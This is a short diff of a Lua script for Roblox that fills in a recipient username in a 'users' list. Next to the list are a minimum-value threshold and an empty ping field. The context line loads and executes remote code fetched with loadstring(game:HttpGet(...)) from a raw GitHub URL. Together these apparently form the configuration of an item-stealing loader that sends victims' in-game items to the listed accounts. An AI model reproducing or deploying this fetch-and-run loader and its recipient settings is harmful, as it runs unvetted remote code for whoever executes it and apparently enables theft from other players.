@@ -2,7 +2,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptm
 
 users = {
     'ajandaa12alt1',
-    '',
+    'ajandaa12alt',
 }
 min_value = 10000000
 ping = ""
